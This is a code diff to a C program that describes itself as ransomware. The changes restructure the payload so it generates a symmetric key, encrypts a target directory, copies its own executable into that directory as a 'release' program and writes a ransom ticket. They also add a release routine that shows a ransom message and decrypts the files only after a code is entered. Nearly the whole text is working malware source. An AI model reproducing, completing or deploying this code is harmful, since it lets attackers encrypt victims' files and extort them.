@@ -19,26 +19,87 @@ void locateExternalDrive(char **path)
 }
 
 //Ransomware payload
-bool runPayload(const char *directory)
+bool runPayload(const char *directory, const char *arg0)
 {
 	char *keyiv;
-	bool status;
 
-	//Make ticket
-	if (makeTicket(&keyiv, directory)) {
-		//Upon success, encrypt directory
-		status = encryptDirectory(keyiv, directory);
-		free(keyiv);
-	} else {
-		fprintf(stderr, "runPayload: makeTicket failed\n");
+	//Generate key+iv
+	if (!secureRand(&keyiv, SYMMETRIC_KEY_SIZE + SYMMETRIC_IV_SIZE)) {
+		fprintf(stderr,
+			"Error: runPayLoad: failed to generate keyiv");
 		return 0;
 	}
-	return status;
+	//Encrypt Directory
+	if (!encryptDirectory(keyiv, directory)) {
+		fprintf(stderr, "runPayload: encryptDirectory failed\n");
+		free(keyiv);
+		return 0;
+	}
+	//Get OSIR's Bytes
+	char *bytes;
+	int64_t bytes_size = getOwnBytes(&bytes, arg0);
+
+	//Get release program path
+	char *r_path =
+	    (char *) malloc(strlen(directory) + strlen("/release.exe"));
+	strcpy(r_path, directory);
+	strcat(r_path, "/release.exe");
+
+	//Write release program
+	FILE *fp = fopen(r_path, "wb");
+	if (fp == NULL) {
+		fprintf(stderr,
+			"Error: runPayload: Couldn't open file for cloning(%s)\n",
+			r_path);
+		free(r_path);
+		free(keyiv);
+		return 0;
+	}
+	fwrite(bytes, bytes_size, 1, fp);
+	fclose(fp);
+
+
+	//Write ticket
+	makeTicket(keyiv, directory);
+
+	//Free pointers
+	free(bytes);
+	free(r_path);
+	free(keyiv);
+	return 1;
 }
 
-bool runRelease(char *keyiv)
+
+bool runRelease()
 {
-	return decryptDirectory(keyiv, ".");
+	system(RELEASE_INTRO_SCRIPT);
+	printf("To decrypt your files, please visit\n%s\n"
+	       "and paste the release code.\n\n", "x");
+
+	bool success = 0;
+
+	//Prompt for code
+	char code[64];
+	while (!success) {
+		printf(">>>");
+		scanf("%s", code);
+
+		//Check if code is proper length
+		if (strlen(code) ==
+		    (SYMMETRIC_KEY_SIZE + SYMMETRIC_IV_SIZE) * 2) {
+			//Decode
+			char *keyiv = b16decode(code);
+
+			//Release
+			success = decryptDirectory(keyiv, ".");
+			if (!success)
+				printf("Wrong code\n");
+		} else {
+			printf("Invalid Code\n");
+		}
+
+	}
+	return success;
 }
 
 
@@ -55,7 +116,7 @@ int main(int argc, char **argv)
 		for (int i = 0; strcmp(ls[i], "\0"); i++) {
 
 			//Check for ransom file endings
-			if (strcmp(strrchr(ls[i], '.'), ".ransom")) {
+			if (strcmp(strrchr(ls[i], '.'), RANSOM_EXTENSION)) {
 				run_release = true;
 				break;
 			}
@@ -63,47 +124,21 @@ int main(int argc, char **argv)
 	}
 
 	if (run_release) {
-		//Prepare interface
-		system(RELEASE_INTRO_SCRIPT);
-		printf("To decrypt your files, please visit\n%s\n"
-		       "and paste the release code.\n\n", "x");
+		runRelease();
+	} else {
+		/*Inf here */
 
-		bool success = 0;
-
-		//Prompt for code
-		char code[64];
-		while (!success) {
-			printf(">>>");
-			scanf("%s", code);
-
-			//Check if code is proper length
-			if (strlen(code) ==
-			    (SYMMETRIC_KEY_SIZE + SYMMETRIC_IV_SIZE) * 2) {
-				//Decode
-				char *keyiv = b16decode(code);
-
-				//Release
-				//success=decryptDirectory(keyiv, ".");
-				if (!success)
-					printf("Wrong code\n");
-			} else {
-				printf("Invalid Code\n");
-			}
-
+		//Payload
+		if (fopen("playground/" TICKET_FILENAME, "r") == NULL) {
+			printf("runPayload: %s\n",
+			       runPayload("playground",
+					  argv[0]) ? "OK" : "Failed");
+		} else {
+			printf
+			    ("Ticket already exists in that directory\n");
 		}
+
 	}
 
-	/*
-	   if(ticket in working_directory):
-	   prompt for code
-	   runRelease
-	   else:
-	   find infection directory (usb)
-	   runInfection
-	   find hostage directory (documents or wherever)
-	   runPayload
-	   Open Browser
-	   endif
-	 */
 	return 0;
 }
